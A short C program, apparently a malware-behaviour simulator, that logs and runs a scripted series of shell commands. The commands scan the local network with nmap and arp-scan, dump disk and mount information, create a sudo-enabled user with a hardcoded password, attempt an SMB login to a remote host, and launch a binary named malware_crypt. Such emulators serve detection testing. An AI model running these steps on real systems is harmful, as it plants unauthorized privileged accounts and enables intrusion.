#include "malware.h"

// Load a kernel module
// run nmap, arp-scan, add a user

int main(int argc, char **argv) {

	init(argv[0]);

	log_exec("Load a Linux kernel driver module",
	"modprobe bonding");

	log_exec("Install some useful packages",
	"apt-get install nmap arp-scan cryptsetup-bin smbclient -y");

	log_exec("Nmap local network", 
	"nmap -oN /var/tmp/NmapResult.txt -p 80,443 192.168.0.0/30");

	log_exec("ARP Scan local network",
	"arp-scan 192.168.0.0/30 >/var/tmp/arpResult.txt");

	log_exec("Lists all mounted filesystems",
		"mount >/var/tmp/mountResult.txt");

	log_exec("Lists all harddrive partitions",
	"fdisk -l >/var/tmp/fdiskResult.txt");

	log_exec("Create local account for a user John",
	"sudo useradd -p $(openssl passwd -crypt \"MyPass\") \"John\"");

	log_exec("Add John to the sudo group",
	"gpasswd -a \"John\" sudo");

	log_exec("Try to connect to a SMB domain",
	"rpcclient -U john%mypass 1.2.3.4");

	log_exec("Launch malware_crypt",
	"./malware_crypt");

	return EXIT_SUCCESS;
}
